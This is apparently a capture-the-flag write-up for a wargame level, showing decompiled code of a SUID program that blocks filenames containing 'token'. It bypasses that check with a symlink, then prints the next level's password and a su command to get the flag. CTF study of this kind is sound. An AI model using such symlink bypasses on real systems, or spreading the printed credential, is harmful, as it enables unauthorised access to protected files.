`level08` has SUID bit set, it can be run as its owner `flag08`.
`level08` takes a filename as argument and displays its content, but it checks if the filename contains the word `token`, if it does it exits.

```
pcVar1 = strstr((char *)in_stack_00000008[1],"token");
if (pcVar1 != (char *)0x0) {
	printf("You may not access \'%s\'\n",in_stack_00000008[1]);
					/* WARNING: Subroutine does not return */
	exit(1);
}
```

to read	`token`, a symlink witha diferent name is created and passed as argument to `level08`

```
ln -s /home/user/level08/token /tmp/a
./level08 /tmp/a
```

`token` contained `flag09`'s password: quif5eloekouj29ke0vouxean

The following command outputs the flag

```
su -c getflag flag08
```
